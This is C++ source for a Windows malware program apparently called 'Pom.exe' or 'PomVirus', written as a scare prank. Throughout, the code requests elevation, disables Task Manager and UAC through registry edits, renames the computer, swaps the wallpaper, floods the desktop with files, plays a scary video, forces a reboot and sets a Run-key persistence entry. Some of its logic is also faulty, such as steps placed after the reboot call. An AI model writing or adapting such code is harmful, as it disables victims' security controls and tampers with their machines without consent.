#include <windows.h>
#include <shlobj.h>
#include <iostream>
#include <fstream>
#include <string>
#include <ctime>
#include <winuser.h>

// Logging function for debugging
void logMessage(const std::string& message) {
    std::ofstream logFile("C:\\Users\\Hacker Bro\\Desktop\\Malware\\pom_log.txt", std::ios::app);
    if (logFile.is_open()) {
        time_t now = time(nullptr);
        logFile << "[" << ctime(&now) << "] " << message << std::endl;
        logFile.close();
    } else {
        MessageBoxA(NULL, message.c_str(), "Log Error", MB_OK | MB_ICONERROR);
    }
}

// Enable shutdown privilege
bool enableShutdownPrivilege() {
    HANDLE hToken;
    TOKEN_PRIVILEGES tp;
    LUID luid;

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        logMessage("Error: OpenProcessToken failed with error " + std::to_string(GetLastError()));
        return false;
    }

    if (!LookupPrivilegeValue(NULL, SE_SHUTDOWN_NAME, &luid)) {
        logMessage("Error: LookupPrivilegeValue failed with error " + std::to_string(GetLastError()));
        CloseHandle(hToken);
        return false;
    }

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL)) {
        logMessage("Error: AdjustTokenPrivileges failed with error " + std::to_string(GetLastError()));
        CloseHandle(hToken);
        return false;
    }

    logMessage("Shutdown privilege enabled");
    CloseHandle(hToken);
    return true;
}

// Extract embedded resource to file
bool extractResource(const std::string& outputPath, const std::string& resourceType, int resourceId) {
    logMessage("Attempting to extract " + resourceType + " resource");
    HRSRC hResource = FindResource(NULL, MAKEINTRESOURCE(resourceId), resourceType.c_str());
    if (!hResource) {
        logMessage("Error: FindResource failed with error " + std::to_string(GetLastError()));
        return false;
    }
    logMessage("FindResource succeeded");

    HGLOBAL hMemory = LoadResource(NULL, hResource);
    if (!hMemory) {
        logMessage("Error: LoadResource failed with error " + std::to_string(GetLastError()));
        return false;
    }
    logMessage("LoadResource succeeded");

    DWORD dwSize = SizeofResource(NULL, hResource);
    LPVOID lpAddress = LockResource(hMemory);
    if (!lpAddress) {
        logMessage("Error: LockResource failed with error " + std::to_string(GetLastError()));
        return false;
    }
    logMessage("LockResource succeeded");

    std::ofstream file(outputPath, std::ios::binary);
    if (!file.is_open()) {
        logMessage("Error: Failed to open output file at " + outputPath + " with error " + std::to_string(GetLastError()));
        return false;
    }
    file.write((const char*)lpAddress, dwSize);
    file.close();
    logMessage(resourceType + " extracted to " + outputPath + " (size: " + std::to_string(dwSize) + " bytes)");

    // Verify file size
    std::ifstream checkFile(outputPath, std::ios::binary);
    if (!checkFile.is_open()) {
        logMessage("Error: Extracted file cannot be opened with error " + std::to_string(GetLastError()));
        return false;
    }
    checkFile.seekg(0, std::ios::end);
    DWORD fileSize = checkFile.tellg();
    checkFile.close();
    if (fileSize != dwSize) {
        logMessage("Error: Extracted file size (" + std::to_string(fileSize) + ") does not match resource size (" + std::to_string(dwSize) + ")");
        return false;
    }
    return true;
}

// Change wallpaper
bool changeWallpaper(const std::string& wallpaperPath) {
    logMessage("Changing wallpaper");
    if (!SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0, (PVOID)wallpaperPath.c_str(), SPIF_UPDATEINIFILE | SPIF_SENDCHANGE)) {
        logMessage("Error: SystemParametersInfoA failed with error " + std::to_string(GetLastError()));
        return false;
    }
    logMessage("Wallpaper changed to " + wallpaperPath);
    return true;
}

// Get executable directory
std::string getExeDirectory() {
    char exePath[MAX_PATH];
    if (GetModuleFileNameA(NULL, exePath, MAX_PATH)) {
        std::string path(exePath);
        size_t lastSlash = path.find_last_of("\\");
        if (lastSlash != std::string::npos) {
            return path.substr(0, lastSlash + 1);
        }
    }
    logMessage("Error: Failed to get executable directory with error " + std::to_string(GetLastError()));
    return "";
}

// Create message file
bool createMessageFile() {
    std::string exeDir = getExeDirectory();
    std::string messagePath = exeDir + "message.txt";
    std::ofstream messageFile(messagePath);
    if (messageFile.is_open()) {
        messageFile << "You are Gone. Enjoy Last Minutes Of Your PC btw Pom.exe is Created By MrHackBro. Be Sure To Subscribe him";
        messageFile.flush();
        if (messageFile.good()) {
            messageFile.close();
            logMessage("Message file created at " + messagePath);
            return true;
        } else {
            logMessage("Error: Failed to write to message file at " + messagePath);
            messageFile.close();
            return false;
        }
    } else {
        logMessage("Error: Failed to open message file at " + messagePath + " with error " + std::to_string(GetLastError()));
        return false;
    }
}

// Placeholder for embedded MP4 resource
bool extractVideoResource(const std::string& outputPath) {
    return extractResource(outputPath, "MP4", 100);
}

// Generate "You are gone" sound using Beep
void generateSound() {
    logMessage("Generating sound");
    Beep(440, 200); // "You"
    Beep(494, 200);
    Beep(523, 300); // "are"
    Beep(587, 200);
    Beep(659, 400); // "gone"
    Beep(523, 300);
    logMessage("Sound generated");
}

// Play video in fullscreen
bool playVideo() {
    logMessage("Starting video playback");
    char tempPath[MAX_PATH];
    GetTempPath(MAX_PATH, tempPath);
    std::string videoPath = std::string(tempPath) + "RockingChairScaryPopUp.mp4";

    if (!extractVideoResource(videoPath)) {
        MessageBox(NULL, "Failed to extract video!", "Error", MB_OK | MB_ICONERROR);
        return false;
    }

    // Check file accessibility
    std::ifstream checkFile(videoPath, std::ios::binary);
    if (!checkFile.is_open()) {
        logMessage("Error: Extracted video file is inaccessible at " + videoPath + " with error " + std::to_string(GetLastError()));
        return false;
    }
    checkFile.close();
    logMessage("Extracted video file is accessible");

    // Playback with Windows Media Player in fullscreen
    std::string params = "\"" + videoPath + "\" /fullscreen";
    SHELLEXECUTEINFO sei = { sizeof(sei) };
    sei.fMask = SEE_MASK_NOCLOSEPROCESS;
    sei.lpVerb = "open";
    sei.lpFile = "wmplayer.exe";
    sei.lpParameters = params.c_str();
    sei.nShow = SW_MAXIMIZE;

    logMessage("Attempting to launch video in fullscreen with wmplayer.exe");
    if (!ShellExecuteEx(&sei)) {
        logMessage("ShellExecute failed with error " + std::to_string(GetLastError()));
        MessageBox(NULL, "Failed to play video!", "Error", MB_OK | MB_ICONERROR);
        return false;
    }

    // Wait for player to close
    logMessage("Waiting for video playback to complete");
    WaitForSingleObject(sei.hProcess, INFINITE);
    DWORD exitCode;
    GetExitCodeProcess(sei.hProcess, &exitCode);
    logMessage("Video playback completed with exit code: " + std::to_string(exitCode));
    CloseHandle(sei.hProcess);

    // Retain temp file for debugging
    logMessage("Temp video file retained for debugging at " + videoPath);
    return true;
}

// Create 50 files on desktop
void createFilesOnDesktop() {
    logMessage("Creating desktop files");
    char desktopPath[MAX_PATH];
    if (FAILED(SHGetFolderPath(NULL, CSIDL_DESKTOP, NULL, 0, desktopPath))) {
        logMessage("Error: Failed to get desktop path with error " + std::to_string(GetLastError()));
        return;
    }

    for (int i = 0; i < 50; i++) {
        std::string filePath = std::string(desktopPath) + "\\You are gone " + std::to_string(i) + ".txt";
        std::ofstream file(filePath);
        if (file.is_open()) {
            file << "You are gone";
            file.close();
            logMessage("Created file: " + filePath);
        } else {
            logMessage("Failed to create file: " + filePath + " with error " + std::to_string(GetLastError()));
        }
    }
    logMessage("Desktop files creation complete");
}

// Change computer name
void changeComputerName() {
    logMessage("Changing computer name");
    const char* newName = "You are gone";
    if (!SetComputerNameExA(ComputerNamePhysicalNetBIOS, newName)) {
        logMessage("Error: SetComputerNameExA failed with error " + std::to_string(GetLastError()));
        return;
    }
    logMessage("Computer name set to 'You are gone'");

    HKEY hKey;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Control\\ComputerName\\ComputerName", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        if (RegSetValueExA(hKey, "ComputerName", 0, REG_SZ, (BYTE*)newName, strlen(newName) + 1) == ERROR_SUCCESS) {
            logMessage("Registry updated with new computer name");
        } else {
            logMessage("Error: Failed to set registry value with error " + std::to_string(GetLastError()));
        }
        RegCloseKey(hKey);
    } else {
        logMessage("Error: Failed to open registry key with error " + std::to_string(GetLastError()));
    }
}

// Prevent user escape (disable task manager)
void blockInput() {
    logMessage("Blocking input (disabling Task Manager)");
    HKEY hKey;
    LONG result = RegCreateKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_SET_VALUE, NULL, &hKey, NULL);
    if (result == ERROR_SUCCESS) {
        DWORD disable = 1;
        if (RegSetValueExA(hKey, "DisableTaskMgr", 0, REG_DWORD, (BYTE*)&disable, sizeof(disable)) == ERROR_SUCCESS) {
            logMessage("Task Manager disabled");
        } else {
            logMessage("Error: Failed to set DisableTaskMgr value with error " + std::to_string(GetLastError()));
        }
        RegCloseKey(hKey);
    } else {
        logMessage("Error: Failed to create/open registry key with error " + std::to_string(result));
    }
}

// Check if running as admin
bool isElevated() {
    logMessage("Checking elevation status");
    BOOL elevated = FALSE;
    PSID adminGroup = NULL;
    SID_IDENTIFIER_AUTHORITY ntAuthority = SECURITY_NT_AUTHORITY;

    if (AllocateAndInitializeSid(&ntAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &adminGroup)) {
        if (CheckTokenMembership(NULL, adminGroup, &elevated)) {
            logMessage(elevated ? "Process is elevated" : "Process is not elevated");
        } else {
            logMessage("Error: CheckTokenMembership failed with error " + std::to_string(GetLastError()));
        }
        FreeSid(adminGroup);
    } else {
        logMessage("Error: AllocateAndInitializeSid failed with error " + std::to_string(GetLastError()));
    }
    return elevated;
}

// Request UAC elevation
bool requestAdminPrivileges() {
    logMessage("Requesting admin privileges");
    if (isElevated()) {
        logMessage("Already running with admin privileges");
        return true;
    }

    char szPath[MAX_PATH];
    if (!GetModuleFileNameA(NULL, szPath, MAX_PATH)) {
        logMessage("Error: Failed to get module file name with error " + std::to_string(GetLastError()));
        return false;
    }

    // Relaunch with "runas"
    SHELLEXECUTEINFOA sei = { sizeof(sei) };
    sei.lpVerb = "runas";
    sei.lpFile = szPath;
    sei.nShow = SW_SHOWNORMAL;
    if (ShellExecuteExA(&sei)) {
        logMessage("Relaunched with admin privileges, exiting current instance");
        exit(0); // Exit non-elevated instance
    }
    logMessage("Error: Failed to relaunch with admin privileges with error " + std::to_string(GetLastError()));
    return false;
}

// Disable UAC
bool disableUAC() {
    logMessage("Attempting to disable UAC");
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        DWORD value = 0;
        if (RegSetValueExA(hKey, "EnableLUA", 0, REG_DWORD, (BYTE*)&value, sizeof(DWORD)) == ERROR_SUCCESS) {
            logMessage("UAC disabled successfully");
        } else {
            logMessage("Error: Failed to set EnableLUA with error " + std::to_string(GetLastError()));
            RegCloseKey(hKey);
            return false;
        }
        RegCloseKey(hKey);
    } else {
        logMessage("Error: Failed to open UAC registry key with error " + std::to_string(GetLastError()));
        return false;
    }
    return true;
}

int main() {
    logMessage("Program started");

    // Request UAC elevation
    if (!requestAdminPrivileges()) {
        logMessage("Error: Admin privileges required");
        MessageBox(NULL, "Administrator privileges required!", "Error", MB_OK | MB_ICONERROR);
        return 1;
    }

    // Block user input
    blockInput();

    // Play video and sound
    if (!playVideo()) {
        logMessage("Video playback failed, continuing with other tasks");
    }
    generateSound();

    // Show warning
    logMessage("Showing warning message");
    MessageBox(NULL, "Pom.exe is dangerous. Now you are gone.", "Warning", MB_OK | MB_ICONWARNING);

    // Create files
    createFilesOnDesktop();

    // Change computer name
    changeComputerName();

    // Change wallpaper
    char tempPath[MAX_PATH];
    GetTempPath(MAX_PATH, tempPath);
    std::string wallpaperPath = std::string(tempPath) + "scary_wallpaper.jpg";
    if (extractResource(wallpaperPath, "JPEG", 101) && changeWallpaper(wallpaperPath)) {
        logMessage("Wallpaper change successful");
    } else {
        logMessage("Wallpaper change failed");
    }

    // Delay to allow name change to propagate
    logMessage("Delaying for name change to propagate");
    Sleep(5000);

    // Disable UAC
    if (!disableUAC()) {
        logMessage("Warning: UAC disable failed, proceeding with reboot");
    }

    // Enable shutdown privilege
    if (!enableShutdownPrivilege()) {
        logMessage("Failed to enable shutdown privilege, proceeding without restart");
    }

    // Restart PC
    logMessage("Initiating system restart");
    if (!ExitWindowsEx(EWX_REBOOT, 0)) {
        logMessage("ExitWindowsEx failed with error " + std::to_string(GetLastError()) + ", falling back to system command");
        system("shutdown /r /t 0"); // Fallback to command-line shutdown
    }

    // Create message file
    if (!createMessageFile()) {
        logMessage("Warning: Failed to create message file, post-reboot message may not work");
    }

    // Add to Run key to open message file on startup
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        std::string exeDir = getExeDirectory();
        std::string messagePath = exeDir + "message.txt";
        std::string runCmd = std::string("cmd.exe /c start \"\" \"C:\\Windows\\System32\\notepad.exe\" \"") + messagePath + "\"";
        if (RegSetValueExA(hKey, "PomVirus", 0, REG_SZ, (BYTE*)runCmd.c_str(), runCmd.length() + 1) == ERROR_SUCCESS) {
            logMessage("Run key set to open message file: " + runCmd);
        } else {
            logMessage("Error: Failed to set run key value with error " + std::to_string(GetLastError()));
        }
        RegCloseKey(hKey);
    } else {
        logMessage("Error: Failed to open run key with error " + std::to_string(GetLastError()));
    }

    logMessage("Program completed");
    return 0;
}

// Handle post-reboot behavior with fallback
int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    logMessage("WinMain started");
    std::string exeDir = getExeDirectory();
    std::string messagePath = exeDir + "message.txt";
    if (std::ifstream(messagePath).good()) {
        logMessage("Message file found, attempting to open");
        ShellExecuteA(NULL, "open", "C:\\Windows\\System32\\notepad.exe", messagePath.c_str(), NULL, SW_SHOW);
        logMessage("Notepad launched with message file");
    } else {
        logMessage("Message file not found at " + messagePath);
    }
    return 0;
}